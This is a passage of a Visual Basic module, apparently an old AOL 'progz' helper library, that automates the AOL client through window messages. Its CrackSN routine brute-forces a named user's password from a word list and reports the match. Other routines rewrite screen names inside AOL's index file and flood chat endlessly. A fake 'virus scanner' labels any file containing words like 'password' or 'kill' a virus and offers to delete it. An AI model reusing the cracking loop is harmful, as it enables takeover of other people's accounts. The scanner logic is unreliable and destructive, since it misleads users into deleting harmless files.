    If Rich& <> 0& And AOLList& <> 0& And AOLIcon& <> 0& And AOLStatic& <> 0& Then
        FindChatRoom& = Child&
        Exit Function
    Else
        Do
            Child& = FindWindowEx(MDI&, Child&, "AOL Child", vbNullString)
            Rich& = FindWindowEx(Child&, 0&, "RICHCNTL", vbNullString)
            AOLList& = FindWindowEx(Child&, 0&, "_AOL_Listbox", vbNullString)
            AOLIcon& = FindWindowEx(Child&, 0&, "_AOL_Icon", vbNullString)
            AOLStatic& = FindWindowEx(Child&, 0&, "_AOL_Static", vbNullString)
            If Rich& <> 0& And AOLList& <> 0& And AOLIcon& <> 0& And AOLStatic& <> 0& Then
                FindChatRoom& = Child&
                Exit Function
            End If
        Loop Until Child& = 0&
    End If
    FindChatRoom& = Child&
End Function

Public Function Chat_RoomName() As String
Chat_RoomName = GetText(FindChatRoom&)
End Function


Public Sub KillModal()
Dim Modal As Long, Butt As Long
 Modal& = FindWindow("_AOL_Modal", vbNullString)
 Butt& = FindWindowEx(Modal&, 0&, "_AOL_Icon", vbNullString)
     If Modal <> 0& Then
        Call SendMessage(Butt&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(Butt&, WM_LBUTTONUP, 0&, 0&)
     End If
Call SendMessage(Modal&, WM_CLOSE, 0, 0)
End Sub

Public Sub killwait()
Dim Modal As Long, Butt As Long
Call RunMenuByString("&About America Online")
Do
DoEvents
 Modal& = FindWindow("_AOL_Modal", vbNullString)
 Butt& = FindWindowEx(Modal&, 0&, "_AOL_Icon", vbNullString)
Loop Until Butt& <> 0& And Modal& <> 0&
TimeOut 0.01
Do
DoEvents
    Call SendMessage(Butt&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(Butt&, WM_LBUTTONUP, 0&, 0&)
Loop Until Modal& = 0&
TimeOut 0.15
End Sub

Public Sub SetText(Window As Long, Text As String)
Call SendMessageByString(Window, WM_SETTEXT, 0, Text)
End Sub

Public Sub SignOff()
Call RunMenuByString("&Sign Off")
End Sub

Public Sub ResetSN(SN As String, aoldir As String, Replace As String)
' This sub was taken from another .bas
Dim l0036  As Integer, i As String, Text As String, ReplaceX As String
Dim X As Integer, LF2 As Long, Where1 As Long, Where2 As Long
l0036 = Len(SN)
Select Case l0036
Case 3
i = SN$ + "       "
Case 4
i = SN$ + "      "
Case 5
i = SN$ + "     "
Case 6
i = SN$ + "    "
Case 7
i = SN$ + "   "
Case 8
i = SN$ + "  "
Case 9
i = SN$ + " "
Case 10
i = SN$
End Select
l0036 = Len(Replace$)
Select Case l0036
Case 3
Replace$ = Replace$ + "       "
Case 4
Replace$ = Replace$ + "      "
Case 5
Replace$ = Replace$ + "     "
Case 6
Replace$ = Replace$ + "    "
Case 7
Replace$ = Replace$ + "   "
Case 8
Replace$ = Replace$ + "  "
Case 9
Replace$ = Replace$ + " "
Case 10
Replace$ = Replace$
End Select
X = 1
Do Until 2 > 3
Text$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
Text$ = String(32000, 0)
Get #1, X, Text$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, Text$, i, 1)
If Where1 Then
Mid(Text$, Where1) = Replace$
ReplaceX$ = Replace$
Put #2, X + Where1 - 1, ReplaceX$
401:
DoEvents
Where2 = InStr(1, Text$, i, 1)
If Where2 Then
Mid(Text$, Where2) = Replace$
Put #2, X + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
X = X + 32000
LF2 = LOF(2)
Close #2
If X > LF2 Then GoTo 301
Loop
301:
End Sub
Public Sub SignOn_Guest(ScreenName As String, PassWord As String)
On Error Resume Next
Dim AOL As Long, Child As Long, MDI As Long, Icon As Long, PW As Long
Dim Combo As Long, Modal As Long, EnterPW As Long, EnterSN As Long
Dim Icon2 As Long, Box As Long, OK As Long, i As Integer, Cancel As Long
AOL = FindWindow("AOL Frame25", vbNullString)
MDI = FindWindowEx(AOL, 0&, "MDIClient", vbNullString)
Child = FindWindowEx(MDI, 0&, "AOL Child", vbNullString)
Combo = FindWindowEx(Child, 0&, "_AOL_Combobox", vbNullString)
Icon = FindWindowEx(Child, 0&, "_AOL_Icon", vbNullString)
Icon = FindWindowEx(Child, Icon, "_AOL_Icon", vbNullString)
Icon = FindWindowEx(Child, Icon, "_AOL_Icon", vbNullString)
Icon = FindWindowEx(Child, Icon, "_AOL_Icon", vbNullString)
If AOL = 0 Then MsgBox "Open AOL first": Exit Sub
Modal = FindWindowEx(AOL, 0&, "_AOL_Modal", vbNullString)
Icon2 = FindWindowEx(PW, 0&, "_AOL_Icon", vbNullString)
Box = FindWindow("#32770", "America Online")
OK = FindWindowEx(Box&, 0&, "Button", "OK")
If Child = 0 And Combo = 0 And Icon = 0 Then
MsgBox "Please open AOL first.", vbOKOnly
Exit Sub
End If
Call SendMessage(Combo, WM_LBUTTONDOWN, 0&, 0&)
Call SetCursorPos(Screen.Width, Screen.Height)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call SendMessage(Icon, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(Icon, WM_LBUTTONUP, 0&, 0&)
TimeOut 0.1
Do
DoEvents
AOL = FindWindow("AOL Frame25", vbNullString)
PW = FindWindowEx(AOL, 0&, "_AOL_Modal", vbNullString)
EnterSN = FindWindowEx(PW, 0&, "_AOL_Edit", vbNullString)
EnterPW = FindWindowEx(PW, EnterSN, "_AOL_Edit", vbNullString)
Icon2 = FindWindowEx(PW, 0&, "_AOL_Icon", vbNullString)
TimeOut 0.15
Loop Until EnterSN <> 0 And EnterPW <> 0
Call SendMessageByString(EnterSN, WM_SETTEXT, 0&, ScreenName$)
Call SendMessageByString(EnterPW, WM_SETTEXT, 0&, PassWord$)
Call SendMessage(Icon2, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(Icon2, WM_LBUTTONUP, 0&, 0&)
TimeOut 0.15
If Box <> 0 Then
    Call SendMessage(OK, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(OK, WM_LBUTTONUP, 0&, 0&)
    Cancel = FindWindowEx(PW, 0&, "_AOL_Icon", vbNullString)
    Cancel = FindWindowEx(Cancel, Cancel, "_AOL_Icon", vbNullString)
        Call SendMessage(Cancel, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(Cancel, WM_LBUTTONUP, 0&, 0&)
        MsgBox "Invalid name or password"
End If
End Sub

Public Sub SpiralScroll(What As String)
Dim MYLEN As Integer, mystr As String, MyString As String
Start:
MyString = What
MYLEN = Len(MyString)
Do
DoEvents
mystr = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
What = mystr
Call SendChat(What)
TimeOut 0.7
'If What = What Then
'Exit Sub
'End If
GoTo Start
Loop
End Sub

Public Sub StayOnTop(Form1 As Form)
    Call SetWindowPos(Form1.hwnd, HWND_TOPMOST, 0&, 0&, 0&, 0&, FLAGS)
End Sub

Public Sub Keyword(Word As String)
    Dim AOL As Long, Tool As Long, Toolbar As Long
    Dim Combo As Long, Edit As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    Tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(Tool&, 0&, "_AOL_Toolbar", vbNullString)
    Combo& = FindWindowEx(Toolbar&, 0&, "_AOL_Combobox", vbNullString)
    Edit& = FindWindowEx(Combo&, 0&, "Edit", vbNullString)
    Call SendMessageByString(Edit&, WM_SETTEXT, 0&, Word$)
    Call SendMessageLong(Edit&, WM_CHAR, VK_SPACE, 0&)
    Call SendMessageLong(Edit&, WM_CHAR, VK_RETURN, 0&)
End Sub
Public Sub IM_Send(Who As String, What As String)
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim SendButton As Long, OK As Long, Button As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call Keyword("aol://9293:" & Who$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        SendButton& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich& <> 0& And SendButton& <> 0&
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, What$)
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        OK& = FindWindow("#32770", "America Online")
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
    Loop Until OK& <> 0& Or im& = 0&
    If OK& <> 0& Then
        Button& = FindWindowEx(OK&, 0&, "Button", vbNullString)
        Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    End If
End Sub

Public Sub Stopper()
Do
DoEvents
Loop
End Sub

Public Sub TETRINET_SendChat(What As String)
    Dim Tetrinet As Long, Panel As Long, Edit As Long
    Tetrinet& = FindWindow("TForm1", vbNullString)
    Panel& = FindWindowEx(Tetrinet&, 0&, "TPanel", vbNullString)
    Edit& = FindWindowEx(Panel&, 0&, "TEdit", vbNullString)
    Edit& = FindWindowEx(Panel&, Edit&, "TEdit", vbNullString)
    Call SendMessageByString(Edit, WM_SETTEXT, 0&, What$)
    Call SendMessageByString(Edit, WM_CHAR, ENTER_KEY, 0&)
End Sub

Public Sub Text_Load(txtLoad As TextBox, Path As String)
    Dim TextString As String
    On Error Resume Next
    Open Path$ For Input As #1
    TextString$ = Input(LOF(1), #1)
    Close #1
    txtLoad.Text = TextString$
End Sub

Public Sub Text_Save(txtSave As TextBox, Path As String)
    Dim TextString As String
    On Error Resume Next
    TextString$ = txtSave.Text
    Open Path$ For Output As #1
    Print #1, TextString$
    Close #1
End Sub

Public Sub TimeOut(HowLong As Long)
    Dim Current As Long
    Current = Timer
    Do Until Timer - Current >= HowLong
        DoEvents
    Loop
End Sub


Public Sub RunMenuByString(SearchString As String)
    Dim AOL As Long, aMenu As Long, mcount As Long
    Dim LookFor As Long, sMenu As Long, sCount As Long
    Dim LookSub As Long, sID As Long, sString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    aMenu& = GetMenu(AOL&)
    mcount& = GetMenuItemCount(aMenu&)
    For LookFor& = 0& To mcount& - 1
        sMenu& = GetSubMenu(aMenu&, LookFor&)
        sCount& = GetMenuItemCount(sMenu&)
        For LookSub& = 0 To sCount& - 1
            sID& = GetMenuItemID(sMenu&, LookSub&)
            sString$ = String$(100, " ")
            Call GetMenuString(sMenu&, sID&, sString$, 100&, 1&)
            If InStr(LCase(sString$), LCase(SearchString$)) Then
                Call SendMessageLong(AOL&, WM_COMMAND, sID&, 0&)
                Exit Sub
            End If
        Next LookSub&
    Next LookFor&
End Sub

Public Sub Mail_Send(Person As String, subject As String, Message As String)
    Dim AOL As Long, MDI As Long, Tool As Long, Toolbar As Long
    Dim ToolIcon As Long, OpenSend As Long, DoIt As Long
    Dim Rich As Long, EditTo As Long, EditCC As Long
    Dim EditSubject As Long, SendButton As Long, Numba As Integer
    Dim Combo As Long, fCombo As Long, ErrorWindow As Long
    Dim Button1 As Long, Button2 As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    Tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(Tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Do
        DoEvents
        OpenSend& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
        EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        Rich& = FindWindowEx(OpenSend&, 0&, "RICHCNTL", vbNullString)
        Combo& = FindWindowEx(OpenSend&, 0&, "_AOL_Combobox", vbNullString)
        fCombo& = FindWindowEx(OpenSend&, 0&, "_AOL_Fontcombo", vbNullString)
        Button1& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Button2& = FindWindowEx(OpenSend&, Button1&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Numba = 13
        If AOL_Version = "5" Then Numba = 15
        For DoIt& = 1 To Numba
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
    Loop Until OpenSend& <> 0& And EditTo& <> 0& And EditSubject& <> 0& And Combo& <> 0& And Rich& <> 0&
    DoEvents
    Call SendMessageByString(EditTo&, WM_SETTEXT, 0&, Person$)
    DoEvents
    Call SendMessageByString(EditSubject&, WM_SETTEXT, 0&, subject$)
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, Message$)
    TimeOut 0.1
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    TimeOut 0.01
    Call ShowWindow(OpenSend&, SW_HIDE)
End Sub
Public Sub Un_UpChat()
Dim AOL As Long, AOModal As Long, Gauge As Long
Dim Upp As Long
AOL = FindWindow("AOL Frame25", vbNullString)
AOModal = FindWindowEx(AOL, 0&, "_AOL_Modal", vbNullString)
Gauge = FindWindowEx(AOModal, 0&, "_AOL_Gauge", vbNullString)
If Gauge <> 0 Then Upp = AOModal
Call EnableWindow(AOL, 1)
Call ShowWindow(Upp, SW_MAXIMIZE)
End Sub

Public Sub UpChat()
Dim AOL As Long, AOModal As Long, Gauge As Long
Dim Upp As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
AOModal& = FindWindowEx(AOL&, 0&, "_AOL_Modal", vbNullString)
Gauge& = FindWindowEx(AOModal&, 0&, "_AOL_Gauge", vbNullString)
'Call EnableWindow(AOL, 1)
Call ShowWindow(AOModal&, SW_HIDE)
Call ShowWindow(AOModal&, SW_MINIMIZE)
End Sub

Public Sub Mail_AddToList(TheList As ListBox)
On Error Resume Next
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, Count As Long, Q As Integer
    Dim wile As String, soon As String, elev  As String, i As Long, MailStr As String
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    DoEvents
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0 Then Exit Sub
For i = 0 To Count& - 1
    MailStr$ = String$(255, " ")
    Q = SendMessageByString(mTree&, LB_GETTEXT, i, MailStr$)
    wile = InStr(MailStr$, Chr(9))
    soon = Mid(MailStr$, wile + 1, Len(MailStr$))
    elev = InStr(soon, Chr(9))
    MailStr$ = Mid(soon, elev + 1, Len(soon))
    TheList.AddItem Trim(MailStr$)
    DoEvents
    Next i
End Sub
Public Function UserSN() As String
    Dim AOL As Long, MDI As Long, welcome As Long
    Dim Child As Long, UserString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    UserString$ = GetText(Child&)
    If InStr(UserString$, "Welcome, ") <> 0 Then
        UserString$ = Mid$(UserString$, 10, (InStr(UserString$, "!") - 10))
        UserSN = UserString$
        Exit Function
    Else
        Do
            Child& = FindWindowEx(MDI&, Child&, "AOL Child", vbNullString)
            UserString$ = GetText(Child&)
            If InStr(UserString$, "Welcome, ") = 1 Then
                UserString$ = Mid$(UserString$, 10, (InStr(UserString$, "!") - 10))
                UserSN = UserString$
                Exit Function
            End If
        Loop Until Child& = 0&
    End If
    UserSN = "user"
End Function

Public Sub CrackSN(Who As String, Passwords As ListBox, Form1 As Form)
On Error Resume Next
Dim AOL As Long, Child As Long, MDI As Long, Icon As Long, PW As Long
Dim Combo As Long, Modal As Long, EnterPW As Long, EnterSN As Long
Dim Icon2 As Long, Box As Long, OK As Long, i As Integer
If Passwords.ListCount = 0 Then
MsgBox "You need some possible passwords to crack!", 16
Exit Sub
End If
'             START
AOL = FindWindow("AOL Frame25", vbNullString)
MDI = FindWindowEx(AOL, 0&, "MDIClient", vbNullString)
Child = FindWindowEx(MDI, 0&, "AOL Child", vbNullString)
Combo = FindWindowEx(Child, 0&, "_AOL_Combobox", vbNullString)
Icon = FindWindowEx(Child, 0&, "_AOL_Icon", vbNullString)
Icon = FindWindowEx(Child, Icon, "_AOL_Icon", vbNullString)
Icon = FindWindowEx(Child, Icon, "_AOL_Icon", vbNullString)
Icon = FindWindowEx(Child, Icon, "_AOL_Icon", vbNullString)
If AOL = 0 Then MsgBox "Open AOL first": Exit Sub
Modal = FindWindowEx(AOL, 0&, "_AOL_Modal", vbNullString)
PW = FindWindowEx(AOL, 0&, "_AOL_Modal", vbNullString)
EnterSN = FindWindowEx(PW, 0&, "_AOL_Edit", vbNullString)
EnterPW = FindWindowEx(PW, EnterSN, "_AOL_Edit", vbNullString)
Icon2 = FindWindowEx(PW, 0&, "_AOL_Icon", vbNullString)
Box = FindWindow("#32770", "America Online")
OK = FindWindowEx(Box&, 0&, "Button", "OK")
For i = 0 To Passwords.ListCount - 1
If EnterPW <> 0 And EnterSN <> 0 Then
Call SendMessageByString(EnterSN, WM_SETTEXT, 0&, vbNullString)
Call SendMessageByString(EnterPW, WM_SETTEXT, 0&, vbNullString)
Call SendMessageByString(EnterSN, WM_SETTEXT, 0&, Who)
Call SendMessageByString(EnterPW, WM_SETTEXT, 0&, Passwords.list(i))
Call SendMessage(Icon2, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(Icon2, WM_LBUTTONUP, 0&, 0&)
   If Box <> 0 Then
    Call SendMessage(OK, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(OK, WM_KEYUP, VK_SPACE, 0&)
   End If
If Box = 0 Then
Form1.Caption = "Crack Complete:  " & Who & " = " & Passwords.list(i)
Exit Sub
End If
End If
Call SendMessage(Combo, WM_LBUTTONDOWN, 0&, 0&)
'Call SendMessage(Combo, WM_LBUTTONUP, 0&, 0&)
Call SetCursorPos(Screen.Width, Screen.Height)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
Call PostMessage(Combo, WM_KEYDOWN, VK_DOWN, 0&)
'Call SetCursorPos(CurPos.X, CurPos.Y)
Call SendMessage(Icon, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(Icon, WM_LBUTTONUP, 0&, 0&)
'Modal
TimeOut 0.25
Do
DoEvents
PW = FindWindowEx(AOL, 0&, "_AOL_Modal", vbNullString)
EnterSN = FindWindowEx(PW, 0&, "_AOL_Edit", vbNullString)
EnterPW = FindWindowEx(PW, EnterSN, "_AOL_Edit", vbNullString)
TimeOut 0.15
Loop Until EnterSN <> 0 And EnterPW <> 0
TimeOut 0.25
Call SendMessageByString(EnterSN, WM_SETTEXT, 0&, vbNullString)
Call SendMessageByString(EnterPW, WM_SETTEXT, 0&, vbNullString)
Call SendMessageByString(EnterSN, WM_SETTEXT, 0&, Who)
Call SendMessageByString(EnterPW, WM_SETTEXT, 0&, Passwords.list(i))
Call SendMessage(Icon2, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(Icon2, WM_LBUTTONUP, 0&, 0&)
TimeOut 0.15
    Call SendMessage(OK, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(OK, WM_KEYUP, VK_SPACE, 0&)
   TimeOut 0.45
If Box = 0 Then
Form1.Caption = "Crack Complete:  " & Who & " = " & Passwords.list(i)
Exit Sub
End If
Next i
End Sub
Public Sub Virus_Scan(File As String)
On Error Resume Next
Dim Scan As String, Q As Long, X As Integer, Free As Long
Dim Where As Integer, ScanFile As Long
DoEvents
Free = FreeFile
DoEvents
Open File For Binary As #1
DoEvents
For X = 1 To LOF(Free) Step 32000
Scan = Space(32000)
DoEvents
Get #1, X, Scan
Debug.Print Scan
DoEvents
        If InStr(1, Scan, "", 1) Then
                Scan = InStr(1, Scan, "", 1)
                ScanFile = (Where + X) - 1
                Close #1
                Exit For
        End If
 DoEvents
'Check
DoEvents
If InStr(LCase(Scan), LCase("virus")) Then
Q = MsgBox("File is a Virus!  Remove file from computer?", vbCritical + vbYesNo, "haçkmanZ Virus Scan")
If Q = 6 Then
Kill File
End If
Exit Sub
End If
'Check
DoEvents
If InStr(LCase(Scan), LCase("kill")) Then
Q = MsgBox("File is a Virus!  Remove file from computer?", vbCritical + vbYesNo, "HackMaN'Z Virus Scan")
If Q = 6 Then
Kill File
End If
Exit Sub
End If
'Check
DoEvents
If InStr(LCase(Scan), LCase("trojan")) Then
Q = MsgBox("File is a Virus!  Remove file from computer?", vbCritical + vbYesNo, "HackMaNz Virus Scan")
If Q = 6 Then
Kill File
End If
Exit Sub
End If
'Check
DoEvents
If InStr(LCase(Scan), LCase("win.ini")) Then
Q = MsgBox("File is a Virus!  Remove file from computer?", vbCritical + vbYesNo, "HackMaNz Virus Scan")
If Q = 6 Then
Kill File
End If
Exit Sub
End If
'Check
DoEvents
If InStr(LCase(Scan), LCase("password")) Then
Q = MsgBox("File is a Virus!  Remove file from computer?", vbCritical + vbYesNo, "HackMaNz Virus Scan")
If Q = 6 Then
Kill File
End If
Exit Sub
End If
'Check
DoEvents
If InStr(LCase(Scan), LCase("centenam")) Then
Q = MsgBox("File is a Virus!  Remove file from computer?", vbCritical + vbYesNo, "HackmAnZ Virus Scan")
If Q = 6 Then
Kill File
End If
Exit Sub
End If
'Check
DoEvents
If InStr(LCase(Scan), LCase("steal")) Then
Q = MsgBox("File trys to rename another file!  Remove file from computer?", vbCritical + vbYesNo, "HackMaNz Virus Scan")
If Q = 6 Then
Kill File
End If
Exit Sub
End If
DoEvents
DoEvents
Close #1
Next X
DoEvents
MsgBox "File has no virus!", vbInformation
End Sub

Public Sub Wait_ClickOK()
Dim Box As Long, Button As Long
    Box& = FindWindow("#32770", "America Online")
    Button& = FindWindowEx(Box&, 0&, "Button", "OK")
    TimeOut 0.1
    If Box& = 1 Then
    Do
    DoEvents
    Call SendMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
    Loop Until Box& = 0
    Exit Sub
    End If
End Sub

Public Sub WaitForMailtoOpen()
    Dim AOL As Long, MDI As Long, Child As Long, Rich As Long
    Dim SendStatic As Long, mail As Long, mText As String, mText2 As String

    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Rich& = FindWindowEx(Child&, 0&, "RICHCNTL", vbNullString)
    SendStatic& = FindWindowEx(Child&, 0&, "_AOL_Static", "Send Now")
    If Child& <> 0& And Rich& <> 0& And SendStatic& <> 0& Then
        TimeOut 1.25
        Do
        DoEvents
            Do
            DoEvents
            Loop Until FindForwardWindow = 1
            mText = GetText(Rich&)
            mText = Len(mText)
                If mText = "" Then Exit Sub
            TimeOut 3.5
            mText2 = Len(GetText(Rich&))
        Loop Until mText = mText2
    End If
    
End Sub

Public Sub WaitForMail()
Dim MailBox As Long, TabControl As Long, TabPage As Long
Dim Tree As Long, Count As Integer, Count2 As Integer
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    DoEvents
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    Tree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    
Do
DoEvents
Count = SendMessage(Tree&, LB_GETCOUNT, 0&, 0&)
TimeOut 3
Count2 = SendMessage(Tree&, LB_GETCOUNT, 0&, 0&)
Loop Until Count = Count2
End Sub

Public Sub Welcome_Kill()
Dim AOL As Long, AOLMDI As Long, Welc As Long, Capt As String
AOL& = FindWindow("AOL Frame25", vbNullString)
AOLMDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Welc& = FindWindowEx(AOLMDI&, 0&, "AOL Child", vbNullString)
Capt = GetCaption(Welc&)
If InStr(Capt, "Welcome") Then
    Call ShowWindow(Welc&, SW_HIDE)
End If
End Sub

Public Function IsOnline() As Boolean
Dim AOL As Long, AOLMDI As Long, Welc As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
AOLMDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Welc& = FindWindowEx(AOLMDI&, 0&, "AOL Child", "Welcome, " + UserSN + "!")
    If Welc& <> 0 Then
        IsOnline = True
        Exit Function
    End If
IsOnline = False
End Function

Public Sub Welcome_Show()
Dim AOL As Long, AOLMDI As Long, Welc As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
AOLMDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Welc& = FindWindowEx(AOLMDI&, 0&, "AOL Child", "Welcome, " + UserSN + "!")
Call ShowWindow(Welc&, SW_SHOW)
End Sub

Public Sub Window_Close(Window As Long)
Call SendMessage(Window, WM_CLOSE, 0, 0)
End Sub

Public Sub Window_Hide(Window As Long)
Call ShowWindow(Window&, SW_HIDE)
End Sub

Public Sub Window_Maximize(Window As Long)
    Call ShowWindow(Window&, SW_MAXIMIZE)
End Sub

Public Sub Window_Minimize(Window As Long)
Call ShowWindow(Window&, SW_MINIMIZE)
End Sub

Public Sub Window_Show(Window As Long)
  Call ShowWindow(Window&, SW_SHOW)
End Sub
Public Sub INI_Write(Section As String, Key As String, KeyValue As String, Directory As String)
    Call WritePrivateProfileString(Section$, UCase$(Key$), KeyValue$, Directory$)
End Sub
Public Function INI_Read(Section As String, Key As String, Directory As String) As String
   Dim strBuffer As String
   strBuffer = String(750, Chr(0))
   Key$ = LCase$(Key$)
   INI_Read$ = Left(strBuffer, GetPrivateProfileString(Section$, ByVal Key$, "", strBuffer, Len(strBuffer), Directory$))
End Function
Public Sub Windows_Restart()
Dim Ask As Long
Ask = MsgBox("Are you sure you want to restart Windows?", vbYesNo, "Restart")
If Ask = 6 Then
Call ExitWindowsEx(EWX_REBOOT, 0)
End If
End Sub

Public Sub Windows_ShutDown()
Dim Ask As Long
Ask = MsgBox("Are you sure you wanna exit Windows?", vbYesNo, "Shut Down")
If Ask = 6 Then
Call ExitWindowsEx(EWX_SHUTDOWN, 0)
End If
End Sub


